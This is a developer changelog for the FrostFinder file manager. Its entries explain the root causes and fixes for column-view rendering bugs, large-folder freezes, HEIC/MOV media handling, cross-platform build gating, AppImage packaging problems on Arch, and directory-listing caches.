**Root cause:** When the user clicked quickly through subdirectories (col1 → col2 → col3 before col2 finished streaming), the stale guard in `_streamDir` fired `resolve(null)` as soon as `mySeq !== _navSeq` — abandoning the stream immediately. The col2 element was left frozen at its first-paint chunk (60 entries) because the full entry list never arrived. The column looked wrong and was empty for most of its files until the user revisited it.

**Fix:** The stale guard no longer abandons mid-stream. When `mySeq !== _navSeq`, chunks are still accumulated silently. On `done:true`:
1. The Rust cache is already populated (happens inside `list_directory_streamed` before the final emit).
2. `col.entries` and `col._fp` are patched in-place on the state object.
3. `_jsCacheSet` stores the full list for zero-IPC revisits.
4. `colEl._patchEntries()` is called directly on the DOM column element to update the visible rows without triggering a full `render()`.

The column fills in completely regardless of how fast the user navigated through it.

---

### Fix — Duplicate entries in dirs with exactly 60 files (`src-tauri/src/main.rs`)

**Root cause:** In `list_directory_streamed`, `already_sent` was computed as:

```rust
let already_sent = if total <= FIRST_CHUNK { 0 } else { ... };
```

The first-paint chunk fires when `all.len() == FIRST_CHUNK` (exact equality). With `<=`, a directory containing exactly 60 files set `already_sent = 0` and re-sent all 60 entries in the `done` chunk — JS accumulated 120 entries and rendered every file twice.

**Fix:** Changed `<=` to `<`:

```rust
let already_sent = if total < FIRST_CHUNK { 0 } else { ... };
```

Directories with exactly `FIRST_CHUNK` entries now correctly set `already_sent = FIRST_CHUNK` and send an empty remainder in the done chunk.

---



**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src/views.js`, `src/ql-window.js`, and `src/main.js`.

### Fix — 3rd-column glitch on deep subfolder navigation (`src/views.js`)

**Root cause:** When navigating into a subdirectory in column view, the streamer emits a first-paint chunk (60 entries) immediately, then continues streaming the rest. When `done:true` arrives, `_patchEntries` fully repaints the column and sets `_cPainted` to the correct rendered range. However, the double-RAF scheduled at column-build time was still pending and fired *after* `_patchEntries` had already finished — it unconditionally reset `_cPainted = {-1,-1}` and called `_paintColList()` again from scratch.

This second repaint used whatever `scrollTop` and `clientHeight` were at that moment (often wrong — the scroll container may have shifted after `_patchEntries` scrolled to the selection), producing rows rendered at the wrong offsets. On the 3rd column and deeper, where the horizontal scroll container had already settled and the column height was stable, this manifested as a visible row flash or misaligned selection.

**Fix:** A guard is added at the top of the double-RAF callback:

```js
if (_cPainted.start !== -1) return;
```

`_patchEntries` always leaves `_cPainted` with a valid non-`{-1,-1}` range after painting. If it ran before the RAF fires, the RAF exits immediately. If the RAF fires first (empty dir or very fast IPC), `_cPainted` is still `{-1,-1}` and the RAF proceeds as normal. The original double-RAF purpose (deferred first-paint for correct `clientHeight`) is fully preserved for all cases where `_patchEntries` hasn't run yet.

---

### Fix — Large folder freeze made worse by r40 (`src-tauri/src/main.rs`)

**Root cause of the regression:** r40 introduced `list_directory_full_streamed` to break the single large IPC response into 100-entry chunks. However, the implementation switched from `raw.into_par_iter()` (rayon parallel stat across all entries simultaneously) to `batch.iter()` (sequential stat within each chunk). This was strictly worse — the same total number of `stat()` syscalls, but now serialised rather than parallelised. A 1500-file Downloads folder went from ~80ms parallel stat to ~600ms+ sequential stat, making the freeze significantly longer.

**Fix:** Restore rayon parallelism for the stat phase, then chunk the *already-built* `Vec<FileEntry>` purely for IPC emission:

```
Phase 1 (rayon): stat all entries in parallel → Vec<FileEntry>   [fast, unchanged from pre-r40]
Phase 2 (emit):  loop chunks(100) over the vec → emit dir-full-chunk events  [new, prevents big IPC blob]
```

This gives the original stat speed back while keeping the chunked emit that prevents WebKit from blocking on one large JSON deserialisation.

---

### Fix — HEIC/HEIF files not displaying (`src-tauri/src/main.rs`, `src/main.js`, `src/views.js`, `src/ql-window.js`)

**Root cause:** The `image` crate used for thumbnail generation has no HEIC decoder. `make_thumbnail` would fail for `.heic`/`.heif` files, leaving `thumb_path` empty. The preview and gallery then fell back to serving the raw HEIC bytes via `getMediaUrl`, which WebKit2GTK cannot decode natively on Linux — so nothing was shown.

**Fix — three parts:**

**1. Thumbnail generation** (`make_thumbnail` in `main.rs`): HEIC/HEIF files are now detected by extension before the `image` crate reader is invoked. ffmpeg is used instead:

```rust
if ext == "heic" || ext == "heif" {
    // ffmpeg -i input.heic -vf scale=256:256:... -f image2 -vcodec mjpeg pipe:1
    // Output captured as bytes, stored in the thumb cache as JPEG.
}
```

The cached thumbnail is a standard JPEG, served via the existing media server like all other thumbnails.

**2. New `/heic-jpeg/` media server endpoint** (`handle_media_request` in `main.rs`): For full-resolution display (preview panel click-to-fullscreen, gallery main view), the raw HEIC file is piped through ffmpeg on-the-fly and served as `image/jpeg`. This avoids loading the entire file into memory — ffmpeg stdout is streamed directly to the TCP socket.

**3. `getHeicJpegUrl()` in JS** (`main.js`, injected into `views.js` and `ql-window.js`): All `<img>` src assignments for HEIC/HEIF files now use `/heic-jpeg/` instead of the direct media URL:
- Preview panel (`renderPreview` in `views.js`)
- Gallery main image slot (`renderGalleryView` in `views.js`)
- Quick Look window image (`ql-window.js`)

Non-HEIC images are unaffected — they continue to use `getMediaUrl` directly.

---



**Rust recompile required.** Changes in `src-tauri/src/main.rs`, `src/main.js`, and `src/utils.js`.

### Feature — HEIC / HEIF added to image types (`src/utils.js`, `src-tauri/src/main.rs`)

`.heic` and `.heif` are now recognised as image files across the entire app:

- `IMAGE_EXTS` in `utils.js` — affects colour coding, icon selection, and preview routing in all views
- `is_image_ext()` in `main.rs` — enables thumbnail generation and image preview path in `preview_file`
- `mime_type` match in `preview_file` — returns `image/heic` / `image/heif` so the media server serves them with the correct content type
- `mime_for_path()` in `main.rs` — media server HTTP handler now serves HEIC/HEIF with correct MIME type

Note: in-app `<img>` preview of HEIC depends on WebKit2GTK having HEIC decode support (present in recent builds with libheif). The preview panel falls back gracefully if the codec is unavailable.

---

### Fix — Large folder freeze (Downloads, etc.) (`src-tauri/src/main.rs`, `src/main.js`)

Opening a folder with hundreds or thousands of files caused the app to freeze for 1–2 seconds. Two independent code paths both had this problem.

#### Root cause 1 — Column view tail chunk (`list_directory_streamed`)

The streamed column-view lister correctly emitted a first-paint chunk of 60 entries immediately. However, all remaining entries — up to 1400+ on a large Downloads folder — were sent as a **single** `dir-chunk` event. WebKit's main thread blocked while deserialising that one large JSON blob.

**Fix:** The tail is now emitted in batches of 150 entries. A 1500-file directory now sends ~10 events of ≤150 entries each instead of one event of 1440, giving WebKit room to breathe between chunks.

```
Before: [60] ——— stall ——— [1440 done]
After:  [60] [150] [150] [150] … [remainder done]
```

#### Root cause 2 — List / Gallery / Icon view (`list_directory` → `list_directory_full_streamed`)

These views called `list_directory`, which stat'd every file in parallel with rayon (good) but then returned the entire `Vec<FileEntry>` as a **single `invoke` response**. The whole blob crossed the Tauri WebKit IPC bridge in one shot — same deserialisation freeze as above, but worse because `FileEntry` carries full stat metadata (size, mtime, permissions, etc.) making each entry larger than the fast `FileEntryFast` used in column view.

**Fix:** A new `list_directory_full_streamed` command emits `dir-full-chunk` events in 100-entry batches using the same event pattern as `list_directory_streamed`. The JS `listDirectoryFull()` function now calls this command and reassembles the entries from the stream, identical in API to the caller. The old `list_directory` command is retained for any internal uses.

---



**No Rust recompile required.** Changes in `src/views.js` and `src/ql-window.js` only.

### Fix — MOV files auto-launched mpv without user action (`src/views.js`, `src/ql-window.js`)

`.mov` was listed in `WEBKIT_SKIP_EXTS` in both `views.js` and `ql-window.js`. This set causes `_mountMpvPlayer` (and its QL equivalent) to bypass the `<video>` element entirely and call `mpv_open_external` immediately — no user interaction required. Any MOV file selected in the gallery, preview panel, or Quick Look window silently launched an mpv process.

**Root cause:** MOV was added to `WEBKIT_SKIP_EXTS` as a precaution, but the backend media server already serves `.mov` as `video/quicktime` and GStreamer handles H.264/AAC QuickTime containers natively on Wayland/Linux. The skip was unnecessary.

**Fix:** `'mov'` removed from `WEBKIT_SKIP_EXTS` in both files.

```js
// Before
const WEBKIT_SKIP_EXTS = new Set(['avi','mov','m4v','ogv']);

// After
const WEBKIT_SKIP_EXTS = new Set(['avi','m4v','ogv']);
```

MOV files now route through the standard `<video>` + local HTTP media server path, identical to `.mp4` and `.webm`. In QL, the existing 5s stall-detection + ffmpeg transcode fallback handles any edge-case MOV codec that GStreamer cannot decode natively. mpv is only involved if the user explicitly clicks the fullscreen/open-with-mpv button, or if both GStreamer and the transcode path fail.

---



**No Rust recompile required.** Change in `src/views.js` only.

### Fix — Column view glitches with deep subdirectory navigation (`src/views.js`)

Three compounding bugs caused progressive rendering degradation as you navigated deeper into subdirectories. The effects accumulated with every new column opened.

#### Bug 1 — `ResizeObserver` never disconnected on column removal

Every column build creates a `ResizeObserver` on its `colList` to repaint when the column is resized. When the reconciliation loop removes a column from the DOM (navigating back to a parent folder and into a sibling), the column element is removed with `.remove()` but the `ResizeObserver` is never explicitly disconnected.

A `ResizeObserver` attached to a detached DOM element stops *firing* but stays alive in memory, holding a reference to the closed-over `_paintColList` function and the entire column closure. After 8+ levels of deep navigation, multiple observers accumulate. When anything causes layout recalculation across the page (e.g. the horizontal scroll container getting a new scrollbar), **all accumulated observers fire simultaneously**, each calling `_paintColList` on their respective (now detached) `colList` elements and fighting the live columns for layout budget.

**Fix:** The `ResizeObserver` instance is now stored as `colEl._colRO`. The reconciliation cleanup helper calls `colEl._colRO.disconnect()` before every `container.lastChild.remove()`.

#### Bug 2 — Rubber-band `document` event listeners never removed

`attachRubberBand` registers two `document`-level listeners (`mousemove`, `mouseup`) per column and returns a cleanup function to remove them. The return value was **never stored or called** in `renderColumnView`, so every column visit permanently added two `document` handlers.

These handlers exit immediately via `if (!armed) return` since `armed` can never be set on a removed column's container, so they don't cause incorrect behavior — but with 10+ columns navigated through, 20+ dead handlers fire on every mouse movement. On large directories, this adds up to visible UI lag that presents as "glitchy" column behavior.

**Fix:** The cleanup function returned by `attachRubberBand` is now stored as `colEl._rbCleanup`. The reconciliation cleanup helper calls `colEl._rbCleanup()` before removal.

#### Bug 3 — Initial `_paintColList` called before column is in the DOM

The first `_paintColList()` was called immediately after setting up the virtual scroller, before `colEl.appendChild(colList)` and `container.appendChild(colEl)`. At this point `colList.clientHeight = 0`, so the fallback `|| 400` was used. This painted approximately 20 rows regardless of the column's actual rendered height.

The `ResizeObserver` corrected this in the next frame, but:
- For deep columns (scrolled far right), the one-frame wrong paint was visible as a flash
- The pre-selection scroll RAF used the same `0 → 400px` fallback, setting scroll position based on wrong height — causing the selected row to appear at the bottom of the column instead of centered

**Fix:** The premature `_paintColList()` is removed. A double-`requestAnimationFrame` (fires after layout + horizontal scrollbar settlement) handles the initial paint and scroll-to-selection together:

```js
requestAnimationFrame(() => requestAnimationFrame(() => {
  if (!colList.isConnected) return;  // safety: column removed before first paint
  _cPainted = {start: -1, end: -1};
  if (col.selIdx >= 0) {
    // scroll to selected row using correct clientHeight
    ...
  }
  _paintColList(); // correct height, correct range, no flash
}));
```

Double-RAF ensures the horizontal scroll container has also settled its scrollbar layout (which reduces `clientHeight` by ~15px when many columns make the container overflow), giving a stable `clientHeight` for the paint range calculation.

---


## What's in Beta-4-r37

**No Rust recompile required.** Change in `src-tauri/tauri.conf.json` only.

### Change — AppImage removed from build targets (`src-tauri/tauri.conf.json`)

AppImage bundling on Arch/CachyOS has proven unreliable across multiple fix attempts due to incompatibilities between Tauri's bundled `appimagetool`/`linuxdeploy` AppImages and the Arch environment (FUSE mount namespacing, `eu-strip` DWARF errors). Since `.deb` and `.rpm` bundles build and install cleanly, AppImage is simply removed from the target list.

`"targets": "all"` → `"targets": ["deb", "rpm", "nsis", "msi", "dmg"]`

The `appimage` config block added in r34/r36 is also removed as it is no longer needed.

---


## What's in Beta-4-r36

**No Rust recompile required.** Change in `src-tauri/.cargo/config.toml` only.

### Fix — AppImage still fails even with `fuse2` installed (`src-tauri/.cargo/config.toml`)

**Root cause — two independent failures in the AppImage toolchain:**

**1. `appimagetool` and `linuxdeploy` are themselves AppImages:**

Tauri downloads `appimagetool` and `linuxdeploy` at bundle time and runs them directly. Both tools are distributed as AppImages. On Arch/CachyOS they can fail to self-mount via FUSE even when `libfuse2` is installed — systemd scope restrictions, mount namespace isolation, or socket path mismatches can all prevent the FUSE mount from succeeding, producing a silent non-zero exit that Tauri reports as `error running appimage.sh`.

`APPIMAGE_EXTRACT_AND_RUN=1` tells these tools to extract their internal squashfs to a temp dir and run from there directly, bypassing FUSE entirely. This works on all systems and is the standard workaround for Arch-family environments.

**2. `eu-strip` crashes on Arch-built `.so` files:**

After `linuxdeploy` copies bundled libraries into the AppImage, it calls `eu-strip` (from `elfutils`) on each one. On Arch, libraries built with GCC 13+ include `-ffile-prefix-map=...` DWARF entries that `eu-strip` cannot represent, causing it to exit non-zero. This kills `appimage.sh`.

`NO_STRIP=1` skips the strip pass entirely. The FrostFinder binary itself is already stripped by cargo's `[profile.release]` settings; skipping `eu-strip` on bundled `.so` files only affects the AppImage size by a few MB.

**Fix — `src-tauri/.cargo/config.toml` `[env]` block:**

Variables in `.cargo/config.toml [env]` are inherited by all child processes spawned during `cargo tauri build`, including the Tauri bundler and the `appimage.sh` script it invokes. No wrapper script or shell export needed — these take effect automatically on every `npm run tauri build` invocation.

```toml
[env]
APPIMAGE_EXTRACT_AND_RUN = "1"   # bypass FUSE mount for appimagetool/linuxdeploy
NO_STRIP = "1"                    # skip eu-strip (crashes on Arch GCC 13+ libs)
```

---


## What's in Beta-4-r35

**No Rust recompile required.** Change in `src-tauri/tauri.conf.json` only.

### Fix — `tauri.conf.json` schema error: `'linux' was unexpected` (`src-tauri/tauri.conf.json`)

**Root cause:** In Tauri v1, `.deb` bundle configuration lives directly under `tauri.bundle.deb`, not wrapped inside a `tauri.bundle.linux` object. The r34 fix incorrectly added a `"linux": { "deb": {...} }` nesting that is valid in Tauri v2 but rejected by the Tauri v1 JSON schema validator with:

```
`tauri.conf.json` error on `tauri > bundle`: Additional properties are not allowed ('linux' was unexpected)
```

This error fires on both `tauri dev` and `tauri build` — the dev server cannot start at all.

**Fix:** Hoisted `deb` directly under `bundle`, removing the `linux` wrapper:

```json
// Before (invalid in Tauri v1):
"bundle": {
  "linux": { "deb": { "depends": [...] } }
}

// After (correct Tauri v1 schema):
"bundle": {
  "deb": { "depends": [...] }
}
```

---


## What's in Beta-4-r34

**No Rust recompile required.** Change in `src-tauri/tauri.conf.json` only.

### Fix — AppImage build fails: `error running appimage.sh` (`src-tauri/tauri.conf.json`)

**Root cause — two compounding issues:**

**1. `bundleMediaFramework` not set to `false`:**

Tauri's `appimage.sh` script, when `bundleMediaFramework` is unset (defaults to `true`), attempts to copy every GStreamer plugin, WebKit2GTK shared library, and associated media framework `.so` into the AppImage's internal `/usr/lib`. It then calls `linuxdeploy --plugin gtk` to recursively resolve and bundle transitive dependencies.

On CachyOS and Arch-based systems, this process fails because:
- WebKit2GTK has ~400 shared library dependencies (Mesa, VA-API, GStreamer elements, libdrm, etc.)
- `linuxdeploy`'s `strip` pass calls `eu-strip` (from `elfutils`) on each `.so`, and elfutils on Arch can fail with `DWARF error: cannot represent -ffile-prefix-map=... in DWARF` for libraries built with newer GCC flags
- The entire `appimage.sh` exits non-zero, Tauri reports `error running appimage.sh`

FrostFinder **cannot** usefully bundle WebKit2GTK inside an AppImage anyway — it uses the system WebKit2GTK and GStreamer pipeline for hardware-decoded video (VA-API, inotify, udisksctl). Bundling would produce a broken AppImage that ignores the system GPU/VA-API stack entirely.

**Fix:** Added `"appimage": { "bundleMediaFramework": false }` to `tauri.conf.json`. Tauri passes this flag to `appimage.sh` which skips the GStreamer/WebKit library bundling pass entirely. The AppImage will still embed the FrostFinder binary and its direct non-system Rust dependencies; all WebKit2GTK/GStreamer libs come from the system at runtime (correct behavior).

**2. Missing `libfuse2` on Arch/CachyOS (system fix, not source):**

AppImage itself requires FUSE 2 (`libfuse2`) to mount the `.AppImage` squashfs at runtime. CachyOS and modern Arch ship only `fuse3`; FUSE 2 is not installed by default. Even after the `bundleMediaFramework` fix, the resulting AppImage will fail to *run* on any Arch system without `libfuse2`.

```bash
# Install on CachyOS / Arch:
yay -S fuse2

# Or run AppImages without FUSE (extract-and-run):
./frost-finder-beta-build_4.0.34_amd64.AppImage --appimage-extract-and-run
```

**Alternative for CachyOS / Arch users:** Use the `.tar.gz` or build directly with `cargo tauri build --bundles deb,rpm`. The `.deb` and `.rpm` bundles completed successfully in r33 and do not require FUSE.

**3. Added `linux.deb.depends` for correct Debian packaging:**

Added explicit runtime dependency declarations for the `.deb` bundle:
- `libwebkit2gtk-4.0-37` — WebKit2GTK rendering engine
- `libgtk-3-0` — GTK3 window toolkit
- `libayatana-appindicator3-1` — system tray support

Without these, `dpkg -i` on Ubuntu/Debian succeeds but the app fails at launch with a missing-library error.

---


## What's in Beta-4-r33

**No Rust recompile required for Linux.** Rust recompile required for macOS and Windows (cross-platform fixes in `src-tauri/src/main.rs` and `src-tauri/Cargo.toml`).

### Fix — Full cross-platform build support: CachyOS, Fedora, Ubuntu, macOS, Windows

**Root cause — Linux-only code in `src-tauri/src/main.rs`:**

The entire Rust backend contained Linux-specific code that broke compilation on macOS and Windows:

1. **`mod libc` shadow module** — defined a custom `mod libc` with `statvfs64` (a Linux glibc extension). This shadowed the `libc` crate entirely, preventing `use libc::...` imports from working. On macOS/Windows, `statvfs64` doesn't exist, causing a linker error.

   **Fix:** Removed the `mod libc` shadow module entirely. `_get_disk_space_impl` now uses `libc::statvfs` (available on both Linux and macOS) behind `#[cfg(unix)]`, and returns `(0, 0)` on Windows.

2. **`get_permissions()` unconditional `std::os::unix::fs::PermissionsExt`** — `PermissionsExt` is a Unix-only trait that doesn't compile on Windows.

   **Fix:** Wrapped in `#[cfg(unix)]` block; Windows returns a placeholder string `"----------"`.

3. **`unlock_and_mount_encrypted()` uses `std::os::unix::fs::PermissionsExt`** — same Windows issue. Also references `/dev/shm` (Linux tmpfs, doesn't exist on macOS/Windows) and `udisksctl` (Linux-only D-Bus client).

   **Fix:** Gated the entire implementation to `#[cfg(target_os = "linux")]`; other platforms return an appropriate error message.

4. **`parse_mounts()`, `is_usb_device()`, `is_rotational()`, `get_volume_label()`, `classify_drive()`, `lsblk_unmounted_all()`, `collect_drives_with_unmounted()`** — all read `/proc/mounts`, `/sys/block`, or call `lsblk` and `udisksctl`, which are Linux-only.

   **Fix:** Each function gated with `#[cfg(target_os = "linux")]`. New `get_drives_platform()` dispatcher calls the Linux block, provides a `/Volumes`-based implementation on macOS, and returns an empty `Vec` on Windows.

5. **`mount_drive()` and `eject_drive()`** — both call `udisksctl` (Linux only). eject_drive also calls `umount`.

   **Fix:** `mount_drive()` gated to Linux. `eject_drive()` has a Linux path (udisksctl/umount) and a macOS path (`diskutil unmount`).

6. **`open_file()` hardcoded `xdg-open`** — Linux-only; macOS has `open`, Windows has `cmd /c start`.

   **Fix:** Three-way `#[cfg]` dispatch.

7. **`open_terminal()` Linux-only terminal list** — no macOS Terminal.app or Windows wt.exe / cmd.exe fallbacks.

   **Fix:** macOS uses AppleScript to open Terminal.app; Windows tries Windows Terminal then cmd.exe; Linux keeps existing emulator list.

8. **`open_in_editor()` uses `which` (not available on Windows in PATH by default)** — no macOS or Windows editor paths.

   **Fix:** macOS falls through to `open_file()`; Windows tries `notepad.exe` as guaranteed fallback.

9. **`open_as_root()` uses `pkexec`** — Linux-only privilege escalation.

   **Fix:** Gated to `#[cfg(target_os = "linux")]`; returns informative error on other platforms.

10. **`list_apps_for_file()` scans Linux `.desktop` directories** — no `.desktop` system on macOS/Windows.

    **Fix:** Returns empty list immediately on non-Linux; the "Open With…" dialog will show nothing on those platforms (correct behavior until native app enumeration is implemented).

11. **WebKit2GTK / GStreamer env vars in `main()`** — These vars are WebKit2GTK-specific (Linux). Silently ignored on macOS (WKWebView) and Windows (WebView2) but cluttered the startup.

    **Fix:** Wrapped in `#[cfg(target_os = "linux")]`.

12. **Hot-plug watcher in `setup()`** — polls `/proc/mounts` and `/sys/block` (Linux-only paths).

    **Fix:** Wrapped in `#[cfg(target_os = "linux")]`; watcher simply doesn't start on macOS/Windows.

### Fix — `Cargo.toml` version and rust-version

- **`rust-version = "1.60"`** was incorrect: `OnceLock` (used in `main.rs`) was not stabilized until Rust 1.70. Builds on Rust 1.60–1.69 would fail with a "use of unstable library feature" error. Updated to `rust-version = "1.70"`.
- **`version = "0.1.0"`** was stale; updated to `"4.0.33"` to match `tauri.conf.json`.
- **`notify = { version = "6", features = ["macos_fsevent"] }`** listed `macos_fsevent` unconditionally, which causes a compile warning on Linux and fails on targets without FSEvents. Moved to a `[target.'cfg(target_os = "macos")'.dependencies]` block.

### Fix — Column view glitch: arrow key selection not scrolling into view (`src/views.js`)

**Root cause:** `_patchEntries()` has two fast-path exits — a *pre-sort* check (count + boundary names identical) and a *post-sort* check (sorted boundary paths identical). Both correctly sync `.sel`/`.cut-item`/tag-tint classes on visible rows, but **neither scrolled the column to bring the newly selected row into view**. The `newSelIdx` parameter passed in from `renderColumnView` was completely ignored in both fast-path branches.

**Symptom:** Pressing ↑/↓ arrow keys in column view showed the highlight moving (`.sel` class toggling) but the column viewport never scrolled. After ~10 key presses the selected row disappeared off-screen and appeared frozen.

**Fix:** Added the same viewport-scroll guard used in the full update path to both fast-path returns. If `newSelIdx` is outside the current visible window, the column scrolls to center it and forces a `_paintColList()` repaint to render the newly visible rows. The guard is a no-op when the row is already on-screen (no unnecessary scroll jitter).

---

### Fix — `PACK.sh` path bugs and macOS compatibility

1. **`VERSION_FILE` and `OUT_DIR` used `$(dirname "$SCRIPT_DIR")`** which resolved to the *parent* of the project root — placing `VERSION` and `releases/` outside the project tree entirely. Fixed to `"$SCRIPT_DIR/VERSION"` and `"$SCRIPT_DIR/releases"`.

2. **`sed -i "s/..."` fails on macOS** — GNU sed accepts `-i` without a backup extension; BSD sed (macOS) requires `-i ''`. Added `_sedi()` helper that auto-detects GNU vs BSD sed and invokes the correct form.

3. **`frostfinder-hyprland.conf` unconditionally listed in `zip`** — if the file doesn't exist, zip emits a warning that confuses build scripts. Changed to only include it when the file exists: `[ -f "frostfinder-hyprland.conf" ] && OPTIONAL_FILES+=("frostfinder-hyprland.conf")`.

4. **`VERSION` file not included in zip** — the script writes a `VERSION` file but never packed it, so the next `./PACK.sh` run couldn't read defaults from the previous build. Added `VERSION` to the zip include list.

5. **`releases/` and `dist/` not excluded from zip** — iterative packing could inadvertently include old releases and the Vite build output. Added `--exclude "*/releases/*"` and `--exclude "*/dist/*"`.

---


## What's in Beta-4-r32

**No Rust recompile required.** Change in `src/main.js` only.

### Fix — JS-side directory listing cache: zero-IPC revisits (`src/main.js`)

**Diagnosis from `frostfinder-debug-1773497977694.log`:**

The r31 Rust cache was working correctly — seq=8 BETA1 revisit returned all 142 entries in the first chunk (no partial column). But cache hit navigation was still 18–21ms. The Rust cache eliminated filesystem reads but not the IPC round-trip.

**Root cause — Tauri WebKit IPC overhead is ~15ms minimum:**

A cache hit in Rust still requires two IPC crossings:
1. JS `invoke()` → Tauri dispatches to Rust → ~5–7ms
2. Rust `window.emit()` → Tauri sends to JS → ~5–7ms

These are hard costs of the Tauri/WebKit bridge, independent of payload size or compute. There is nothing the Rust side can do to eliminate them — the wire is the bottleneck.

**Fix — JS-side LRU cache (`_JS_DIR_CACHE`), 30 paths, Map + deque:**

`navigate()` checks a JS `Map<path, FileEntryFast[]>` before calling `_streamDir`. On a cache hit:
1. Render the column immediately from memory (~1ms)
2. Fire a background `_streamDir` call (fire-and-forget, not awaited)
3. If the background call finds the listing changed, update cache and re-render

The background validation ensures stale data is never shown longer than one navigation cycle. In practice, the watcher already evicts `_jsCacheEvict(path)` the moment `dir-changed` fires, so the background check will almost never find a discrepancy.

**Cache invalidation:**
- `dir-changed` watcher event: `_jsCacheEvict(changedPath)` before `refreshColumns()`
- Navigate to new path (cache miss): background validate + `_jsCacheSet(path, result.entries)` on resolve

**Result:**

| Navigation | r31 (Rust cache) | r32 (JS cache) |
|---|---|---|
| First visit (cold) | ~20ms | ~20ms (unavoidable FS + IPC) |
| Revisit (warm) | ~20ms (IPC still runs) | ~3ms (zero IPC) |
| BETA1 142-file revisit | 20ms | ~3ms |
| claude-miller 74-file revisit | 18ms | ~3ms |

**The two caches work in tandem:**
- **JS cache** → instant revisit navigation (zero IPC)
- **Rust cache** → fast `refreshColumns` IPC calls from watcher path

---

## What's in Beta-4-r31

**Rust recompile required.** Change in `src-tauri/src/main.rs` only.

### Fix — Rust-side directory listing LRU cache (`src-tauri/src/main.rs`)

**Diagnosis from `frostfinder-debug-1773497071535.log`:**

All previous fixes worked as expected:
- Watcher fires: eliminated (zero spurious renders in log)
- BETA1 (142 entries): 64ms → 15ms ✔ (toolbar cache fixed this)
- Music first visit: 62ms (unavoidable — cold page cache)

But Music revisits remain 38–42ms despite toolbar cache, because the bottleneck was never JS — it was the Rust filesystem read itself.

**Root cause — repeated filesystem reads with lstat() overhead:**

`list_directory_streamed` re-reads the full directory from the filesystem on every navigation, even for a folder visited 30 seconds ago. On `/home/jay/Music` (542 entries), the OS returns `DT_UNKNOWN` for `d_type` in the dirent buffer, forcing `entry.file_type()` to call `lstat()` — one syscall per entry.

```
482 remaining entries × ~60μs per lstat() = ~29ms
```

This matches the measured `chunk→resolved` gap of 28–30ms exactly. It's a filesystem-level cost: there is no way to make individual `lstat()` calls faster.

The user navigated Music→Pictures→Music→Pictures→Music four times. Each revisit paid the full 29ms again. That's ~120ms of total wasted time reading data that hadn't changed at all.

**Fix — LRU directory listing cache:**

`DirCache` is a bounded LRU cache (`max=30 entries`) backed by `HashMap<String, Vec<FileEntryFast>>` with a `VecDeque<String>` for eviction ordering.

`list_directory_streamed` checks the cache first:

- **Cache hit:** Emit all entries in a single `done:true` message directly from memory. No filesystem reads, no `lstat()` calls, no `spawn_blocking`. Both the first-chunk and final emits collapse into one — JS receives the full listing immediately, eliminating the partial-column flash (the 60-entry column that briefly appears before expanding to 542). Total time: ~6ms (one IPC call).

- **Cache miss:** Read from filesystem as before (two-emit streaming). After the final emit, `cache_insert()` stores the `Vec<FileEntryFast>` for future hits.

**Cache invalidation:** The inotify watcher already calls `cache_evict(path)` whenever `Create`, `Remove`, or `Modify(Name)` fires for the watched directory. This ensures stale data is never served after a file is added, deleted, or renamed.

**Results:**
| Navigation | Before | After |
|---|---|---|
| Music first visit | 42ms | 42ms (unavoidable FS read) |
| Music every revisit | 42ms | ~6ms |
| BETA1 first visit | 18ms | 18ms |
| BETA1 every revisit | 18ms | ~6ms |
| Partial-column flash | always | only on first visit |

---

## What's in Beta-4-r30

**No Rust recompile required.** Change in `src/main.js` only.

### Fix — `renderToolbar()` rebuilding full innerHTML on every render, blocking IPC queue (`src/main.js`)

**Diagnosis from `frostfinder-debug-1773496515338.log`:**

Zero spurious watcher renders in this log — the r27/r28/r29 watcher fixes worked completely. But slow navigations persisted. The pattern was exact: every slow navigation had a `RENDER` event fired between `NAV_FIRST_CHUNK` and `NAV_RESOLVED`, and the `chunk→resolved` gap was 27–45ms.

This is the streaming architecture working as designed — the first-chunk render is intentional. The problem is what that render *does*:

```
NAV_FIRST_CHUNK fires → navigate() calls render()
  render() → _doRender()
    → renderToolbar()   ← THE PROBLEM
       document.getElementById('toolbar').innerHTML = '...(huge string)...'
       Full breadcrumb rebuild, all buttons, view switcher, search input
       ~15–20ms of JS main thread work
    → renderView() (fast, _patchEntries)
    → renderPreview(), renderStatus()

Meanwhile: Rust finishes reading remaining entries, calls window.emit('dir-chunk', done:true)
  → IPC message queued in WebKit event loop
  → Can't be processed until JS main thread is free
  → JS is busy with renderToolbar()
  → done:true waits 15–20ms in the queue

JS finishes render → processes IPC queue → NAV_RESOLVED fires
```

The `chunk→resolved` gap shown in the log **is not Rust IO time** — it is entirely JS main thread blockage from `renderToolbar()`.

**Why renderToolbar was rebuilding unnecessarily:**

During a streaming navigation, the second render (first-chunk) and any subsequent renders before the user does anything have **identical toolbar state**: same path, same `loading=false`, same view mode, same history index, same everything. There is no reason to rebuild the toolbar at all.

**Fix — toolbar state fingerprint cache:**

`_toolbarFp()` computes a cheap string key from all toolbar-relevant state fields: `currentPath`, `historyIdx`, `history.length`, `loading`, `viewMode`, `showHidden`, `searchMode`, `searchQuery`, `search`, `_bcEditMode`.

`renderToolbar()` checks the fingerprint at the top. If it matches the last build, it returns immediately after updating only the spinner element in-place (the one thing that can change independently of the full rebuild). The `innerHTML` rebuild only runs when the fingerprint changes — i.e. when the user actually navigates, changes view mode, toggles hidden files, etc.

Cache is invalidated explicitly on tab switch (state changes completely) and sort order change (view mode buttons need to reflect new state).

**Result:** The first-chunk render now costs ~1ms instead of ~15–20ms. The `done:true` IPC message is processed within 1–2ms of Rust emitting it instead of waiting in queue. `chunk→resolved` gap drops from 27–45ms to ~5ms (pure Rust IO + one IPC call). Music navigation: 40–67ms → ~20ms.

---

## What's in Beta-4-r29

**No Rust recompile required.** Changes in `src/main.js` and `src/views.js`.

### Fix — watcher-triggered renders still causing UI hitches (`src/main.js`, `src/views.js`)

**Diagnosis from `frostfinder-debug-1773495357769.log`:**

The r27+r28 fixes reduced watcher fires from 1.7/s to 0.14/s (12× less frequent). But each remaining fire still triggered a full `render()` cycle:
- `syncState()` — walks all tab state
- `renderToolbar()` — full innerHTML rebuild of the toolbar
- `renderColumnView()` — `_patchEntries` on every column
- `renderPreview()`, `renderStatus()`

The r28 fingerprint check inside `_patchEntries` correctly identified unchanged directories in <0.1ms, but `refreshColumns` called `render()` unconditionally *after* running the patcher — so the full toolbar/preview/status rebuild happened anyway, for zero visible result.

**Three fixes:**

**1. `_patchEntries` now returns a signal (`src/views.js`)**

Both fast-path exit points (pre-sort fingerprint match, post-sort boundary match) now `return false` instead of bare `return`. The full-update path returns `undefined` (truthy in the `!== false` check). This gives the caller a cheap way to know whether the column listing actually changed.

**2. `refreshColumns` skips `render()` when nothing changed (`src/main.js`)**

